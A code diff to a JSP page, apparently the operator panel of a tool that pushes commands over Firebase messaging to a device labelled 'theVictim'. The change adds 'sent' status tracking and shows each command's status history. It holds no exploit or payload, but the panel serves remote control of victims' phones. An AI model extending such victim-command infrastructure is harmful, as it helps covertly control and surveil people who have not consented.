@@ -7,6 +7,7 @@
 <%@ page import="com.theah64.xrob.api.database.tables.*" %>
 <%@ page import="com.theah64.xrob.api.utils.FCMUtils" %>
 <%@ page import="com.theah64.xrob.api.database.tables.command.Commands" %>
+<%@ page import="com.theah64.xrob.api.database.tables.command.CommandStatuses" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -98,21 +99,29 @@
                                         commandOb.setId(commandId);
                                         final boolean isCommandSent = FCMUtils.sendPayload(Command.toFcmPayload(theVictim.getFCMId(), commandOb));
                                         if (isCommandSent) {
-
-                                        } else {
-                                            //TODO: Update command table
-                                            throw new Exception("Failed to send the command : " + command);
-                                        }
+                                            final boolean isStatusAdded = CommandStatuses.getInstance().add(new Command.Status(Command.Status.STATUS_SENT, "Status sent", 0, commandId));
+                                            if (isStatusAdded) {
+                    %>
+                    <p class="text-success strong">Command executed
+                    </p>
+                    <%
                                     } else {
-                                        throw new Exception("Failed to save command : " + command);
+                                        throw new Exception("Command status failed to add");
                                     }
-
                                 } else {
-                                    throw new Exception("Invalid command :" + command);
+                                    //TODO: Update command table
+                                    throw new Exception("Failed to send the command : " + command);
                                 }
+                            } else {
+                                throw new Exception("Failed to save command : " + command);
+                            }
 
-                            } catch (Exception e) {
-                                e.printStackTrace();
+                        } else {
+                            throw new Exception("Invalid command :" + command);
+                        }
+
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     %>
                     <p class="text-danger"><%=e.getMessage()%>
                     </p>
@@ -149,9 +158,26 @@
                         for (final Command command : commands) {
                     %>
                     <tr class="command_row">
-                        <td><%=command.getCommand()%>
+                        <td><code><%=command.getCommand()%></code>
                         </td>
-                        <td><%=command.getStatuses().get(command.getStatuses().size() - 1)%>
+                        <td style="text-align: left">
+                            <%
+                                if (!command.getStatuses().isEmpty()) {
+                                    for (Command.Status status : command.getStatuses()) {
+                            %>
+                            <span class="label <%=status.getBootstrapLabelClassForStatus()%>"><%=status.getStatus() + " " + status.getRelativeReportTime()%></span>
+                            <small>(<%=status.getStatusMessage()%>)
+                            </small><br>
+                            <%
+                                }
+                            } else {
+                            %>
+                            <span class="label label-info">NO STATUS</span>
+                            <br>
+                            <%
+                                }
+
+                            %>
                         </td>
                         <td><%=command.getRelativeEstablishedTime()%>
                         </td>
